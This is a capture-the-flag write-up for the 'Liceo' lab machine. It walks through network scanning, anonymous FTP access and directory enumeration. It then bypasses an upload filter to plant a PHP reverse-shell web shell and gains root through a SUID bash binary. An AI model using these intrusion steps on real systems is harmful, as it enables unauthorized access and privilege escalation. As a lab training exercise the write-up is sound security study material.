---
title: Liceo - Writeup
date: 2024-04 - 10
categories:
  - Writeups
tags:
  - Linux
  - Enumeration
  - PrivEsc
  - Ftp
  - File Upload
---

# Arp-scan 

 Detecting the ip of the machine

```bash
192.168.0.209 08:00:27:76:63:4b PCS Systemtechnik GmbH
```

# Ports

Starting with port scanning by using nmap

```bash
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000          191 Feb 01 14:29 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.101
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:4c:42:8d:10:2c:61:56:7b:26:c4:78:96:6d:28:15 (ECDSA)
|_  256 7e:1a:29:d8:9b:91:44:bd:66:ff:6a:f3:2b:c7:35:65 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Liceo
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 08:00:27:76:63:4B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

We can see that 80, 22 and 21 ports are opened
# FTP

```shell
lftp 192.168.0.209
lftp 192.168.0.209:~> user anonymous
lftp anonymous@192.168.0.209:~> ls
-rw-rw-r--    1 1000     1000          191 Feb 01 14:29 note.txt
lftp anonymous@192.168.0.209:/> cat note.txt 
Hi Matias, I have left on the web the continuations of today's work, 
would you mind contiuing in your turn and make sure that the web will be secure? 
Above all, we dont't want intruders...
```

# Url Enumeration

Use Dirsearch for directory discovery

```shell
dirsearch  -u http://192.168.0.209/
[04:51:20] 301 -  316B  - /uploads  ->  http://192.168.0.209/uploads/  [04:51:20] 200 -  408B  - /uploads/                                    [04:51:21] 200 -  233B  - /upload.php
```

we can see there is a 'upload.php', which we can probably use for FIle Upload
## File upload

We can use the webshell from /usr/share/webshells/php/php-reverse-shell.php 

```shell
cp /usr/share/webshells/php/php-reverse-shell.php ~/
cp php-reverse-shell.php shell1.jpg
```

once we uploaded it, we use burp to change into 'shell1.phtml', which can be successfully uploaded.

![[upload_file.png]]

Then we access '/uploads/shell1.phtml' and then we can get a low shell.

Under /home/dev, we are able to get the user flag.


## Privilege Escalation

```shell
find / -user root -perm /4000 2>/dev/null
/usr/bin/bash
```

then we can do 

```shell
/usr/bin/bash -p
```

and we can get root permission

